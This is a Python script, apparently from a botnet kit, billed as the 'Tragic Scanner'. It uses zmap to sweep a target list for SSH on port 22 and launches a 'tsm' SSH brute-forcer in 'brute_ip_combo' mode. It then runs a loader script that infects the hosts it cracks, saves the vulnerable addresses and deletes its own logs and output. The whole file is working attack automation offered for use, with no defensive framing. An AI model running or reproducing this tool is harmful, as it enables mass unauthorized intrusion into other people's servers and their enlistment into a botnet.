# 'nohup python SaikoScan.py LISTNAME.lst &'

import sys
import time
import subprocess
import warnings

if len(sys.argv) < 2:
	print("\x1b[31mUsage: python %s [LIST]\x1b[0m" % sys.argv[0])
	sys.exit()

lst = sys.argv[1]
	
with open(sys.argv[1], "r") as fd:
	lines = fd.readlines()
	
print ("\x1b[0m[\x1b[1;36m+\x1b[0m] \x1b[1;36mTragic Scanner \x1b[0m[\x1b[1;36m+\x1b[0m]")
print ("[\x1b[1;36m+\x1b[0m] \x1b[1;36mThis Script will Zmap, Run TSM, Then Run Your Loader! \x1b[0m")
print ("[\x1b[1;36m+\x1b[0m] \x1b[1;36mList to Target -> \x1b[0m%s " % sys.argv[1])

raw_input("[\x1b[1;33m+\x1b[0m] \x1b[1;36mPress Enter To Start... ")

def run(cmd):
	subprocess.call(cmd, shell=True)

run("nohup ulimit -n 99999 &")
#ZMap
run("rm -rf i")
print ("\x1b[0m[\x1b[1;33m+\x1b[0m] \x1b[1;36mStarting Zmap... \x1b[0m")
time.sleep(2)
run("nohup zmap -p22 -oi -w"+lst+" &")
time.sleep(1)
#Brute
print ("[\x1b[1;33m+\x1b[0m] \x1b[1;36mZmap Completed! Starting TSM... \x1b[0m")
time.sleep(2)
run("nohup ./tsm -m brute_ip_combo -f 10000000 -p 22 -v 'g0d!!!' -d 2 -r 10000000 &") #Change For Diff Bruter
time.sleep(1)
print ("\x1b[0m[\x1b[1;33m+\x1b[0m] \x1b[1;36mScan Complete - Creating List... \x1b[0m")
time.sleep(2)
#Load
print ("\x1b[0m[\x1b[1;33m+\x1b[0m] \x1b[1;36mRunning Loader... \x1b[0m")
time.sleep(2)
run ("nohup python TSMLoad.py r &")
time.sleep(1)

with open("r") as f:
    with open("Vulns-"+lst+"", "w") as f1:
        for line in f:
            f1.write(line)
run ("nohup rm -rf r &")
run ("nohup rm -rf nohup.out &")
#Done
print ("[\x1b[1;36mRyM\x1b[0m] \x1b[1;36mAutoScan Complete - Now Restart Me with a Different Lst! \x1b[0m[\x1b[1;36mRyM\x1b[0m]")
exit(1)
